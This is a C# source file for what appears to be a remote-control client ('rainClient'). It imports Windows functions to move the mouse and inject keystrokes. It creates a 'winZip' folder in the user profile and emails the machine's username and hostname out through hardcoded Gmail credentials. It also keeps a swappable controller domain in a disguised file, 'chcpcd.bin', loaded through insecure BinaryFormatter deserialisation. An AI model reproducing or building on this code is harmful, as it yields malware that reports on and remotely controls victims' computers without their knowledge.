using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;

namespace rainClient
{
    static class GO
    {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        public static string puth = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\UserProfile\winZip";
        public static string defaultDomain = "http://defaultDomain.com";
        private static object locker = new object();

        static GO()
        {
            string pputh = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\UserProfile\winZip";
            Directory.CreateDirectory(pputh);
        }

        //дефолтный паттерн "<myIP>(.*)</myIP>"
        //"https://www.whatismyip.org" с паттерном "<a href=\"/my-ip-address\">(.*)</a></h3>"
        public static string parceIP(string webSite, string pattern = null)
        {
            try
            {
                Stream stream = new WebClient().OpenRead(webSite);
                StreamReader sr = new StreamReader(stream);
                void closeProcessing()
                {
                    stream.Close();
                    sr.Close();
                }
                string str;
                string newLine;
                Regex regex = pattern == null ? new Regex("<myIP>(.*)</myIP>") : new Regex(pattern);
                while ((newLine = sr.ReadLine()) != null)
                {
                    Match match = regex.Match(newLine);
                    str = match.Groups[1].ToString();
                    if (str != "")
                    {
                        closeProcessing();
                        return str;
                    }
                }
                closeProcessing();
            }
            catch
            {}
            return null;
        }

        public static void sendMail(string message) =>         
            new SmtpClient("smtp.gmail.com", 587)
            {
                Credentials = new NetworkCredential("mail@gmail.com", "mailpaswd"),
                EnableSsl = true
            }.Send(new MailMessage(new MailAddress("mail@gmail.com", "Naruto"), new MailAddress("TOmail@gmail.com"))
            {
                Subject = "Hi",
                Body = $"<h2>UserName {Environment.UserName} </h2><h2>HostName {Dns.GetHostName()}</h2><h2>Message {message}</h2>",
                IsBodyHtml = true
            }); 
        
        public static void writeNewDomein(string domein)
        {
            if (File.Exists(puth + "\\chcpcd.bin"))
                File.Delete(puth + "\\chcpcd.bin");
            FileStream fs = new FileStream(puth + "\\chcpcd.bin", FileMode.OpenOrCreate);
            new BinaryFormatter().Serialize(fs, domein);
            fs.Close();
        }

        public static string getDomain()
        {
            lock (locker)
            {
                if (File.Exists(puth + "\\chcpcd.bin"))
                {
                    string str = null;
                    using (FileStream fS = new FileStream(puth + "\\chcpcd.bin", FileMode.Open))
                    {
                        str = (string)new BinaryFormatter().Deserialize(fS);
                    }
                    return str;
                }
            }
            return defaultDomain;
        }     
    }
}
